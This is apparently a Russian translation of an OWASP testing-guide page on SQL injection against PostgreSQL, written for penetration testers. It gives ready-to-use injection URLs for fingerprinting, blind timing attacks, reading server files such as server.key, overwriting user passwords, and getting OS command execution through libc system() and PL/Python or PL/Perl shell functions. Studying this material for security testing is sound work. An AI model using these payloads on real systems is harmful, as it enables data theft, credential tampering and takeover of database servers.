# PostgreSQL

## Резюме

В этом разделе рассматриваются техники внедрения SQL-кода для PostgreSQL. Эти техники обладают следующими характеристиками:

- PHP-коннектор позволяет выполнять несколько инструкций в одном запросе, используя `;` в качестве разделителя (составные запросы)
- SQL-инструкции можно усекать добавлением символа комментария: `--`.
- В инструкции `SELECT` можно использовать `LIMIT` и `OFFSET` для постраничного извлечения части результирующего набора данных, сформированного запросом (`query`)

Далее предполагается, что URL `https://www.example.com/news.php?id=1` уязвим к атакам SQL Injection.

## Методика тестирования

### Идентификация PostgreSQL

После обнаружения SQL-инъекции необходимо точно идентифицировать движок базы данных бэкенда. Определить, что в качестве СУБД используется PostgreSQL, можно с помощью оператора приведения типов *::*.

#### Примеры

`https://www.example.com/store.php?id=1 AND 1::int=1`

Кроме того, для получения баннера PostgreSQL можно использовать функцию *version()*. Она также отобразит тип и версию используемой операционной системы.

##### Пример

`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

Пример возвращаемой строки баннера:

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### Слепая инъекция

Для атак слепой SQL-инъекции следует учитывать следующие встроенные функции:

- Длина строки
`LENGTH(str)`

- Извлечение подстроки из заданной строки
`SUBSTR(str,index,offset)`

- Представление строки без использования одинарных кавычек
`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

Начиная с версии 8.2, в PostgreSQL появилась встроенная функция `pg_sleep(n)`, приостанавливающая процесс текущей сессии на `n` секунд. Эту функцию можно использовать для реализации атак по времени (подробно рассмотренных в разделе [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).

Кроме того, в более ранних версиях можно легко создать собственную функцию `pg_sleep(n)` с использованием системной библиотеки libc:

- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`

### Удаление экранирования одинарных кавычек

Строки можно кодировать с помощью функции `chr()`, чтобы избежать необходимости экранирования одинарных кавычек.

- `chr(n)`: возвращает символ, ASCII-код которого равен числу `n`
- `ascii(n)`: возвращает числовое значение ASCII, соответствующее символу `n`

Предположим, требуется закодировать строку 'root':

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

Мы можем закодировать 'root' как:

`chr(114)||chr(111)||chr(111)||chr(116)`

#### Пример

`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### Векторы атак

#### Текущий пользователь

Идентификатор текущего пользователя можно получить с помощью следующих SQL-инструкций SELECT:

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### Пример

```text
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### Текущая база данных

Встроенная функция `current_database()` возвращает имя текущей базы данных.

##### Пример

`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### Чтение из файла

PostgreSQL предоставляет два способа доступа к локальным файлам:

- Инструкция `COPY`
- Внутренняя функция `pg_read_file()` (начиная с PostgreSQL 8.1)

##### COPY

Этот оператор копирует данные между файлом и таблицей. Движок PostgreSQL обращается к локальной файловой системе от имени пользователя `postgres`.

###### Пример

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

Данные извлекаются с помощью техники `UNION Query SQL Injection`:

- получение количества строк, добавленных в таблицу `file_store` с помощью инструкции `COPY`
- построчное извлечение записей через инъекцию UNION SQL Injection

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

Эта функция была представлена в `PostgreSQL 8.1` и позволяет читать произвольные файлы, расположенные внутри каталога данных СУБД.

###### Пример

`SELECT pg_read_file('server.key',0,1000);`

#### Запись в файл

Обратив операцию COPY, мы можем записывать данные в локальную файловую систему с правами пользователя `postgres`:

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Внедрение команд оболочки (Shell Injection)

В PostgreSQL предусмотрен механизм добавления пользовательских функций с использованием динамических библиотек и скриптовых языков, таких как Python, Perl и Tcl.

##### Динамическая библиотека

До версии PostgreSQL 8.1 существовала возможность добавления пользовательской функции, слинкованной с `libc`:

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

Поскольку `system` возвращает `int`, как мы можем получить результаты со стандартного вывода `stdout` функции `system`?

Для этого используется следующий прием:

- создание таблицы `stdout`: `CREATE TABLE stdout(id serial, system_out text)`
- выполнение команды оболочки с перенаправлением ее `stdout`: `SELECT system('uname -a > /tmp/test')`
- использование инструкции `COPY` для загрузки вывода предыдущей команды в таблицу `stdout`: `COPY stdout(system_out) FROM '/tmp/test*'`
- извлечение вывода из таблицы `stdout`: `SELECT system_out FROM stdout`

###### Пример

```text
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### Plpython

PL/Python позволяет писать функции PostgreSQL на языке Python. Это ненадежный (untrusted) язык, поэтому ограничить действия пользователя невозможно. Он не установлен по умолчанию и может быть включен для конкретной базы данных с помощью команды `CREATELANG`:

- Проверка включения PL/Python в базе данных: `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- Если не включен, попытка включения: `CREATE LANGUAGE plpythonu`
- Если один из шагов выше успешен, создание прокси-функции оболочки: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
- Выполнение команд: `SELECT proxyshell(os command);`

###### Пример

- Создание прокси-функции оболочки: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--`
- Выполнение команды ОС: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### Plperl

PL/Perl позволяет писать функции PostgreSQL на языке Perl. Обычно он устанавливается как доверенный (trusted) язык для блокирования выполнения операций, взаимодействующих с операционной системой, таких как `open`. В этом случае получение доступа на уровне ОС невозможно. Для успешного внедрения функции proxyshell нам необходимо установить ненадежную (untrusted) версию от имени пользователя `postgres`, чтобы обойти так называемую маску фильтрации доверенных/ненадежных операций.

- Проверка включения ненадежного PL/Perl: `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- Если не включен, предполагая, что системный администратор уже установил пакет plperl, попытка создания: `CREATE LANGUAGE plperlu`
- Если один из шагов успешен, создание прокси-функции оболочки: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
- Выполнение команд: `SELECT proxyshell(os command);`

###### Пример

- Создание прокси-функции оболочки: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
- Выполнение команды ОС: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`
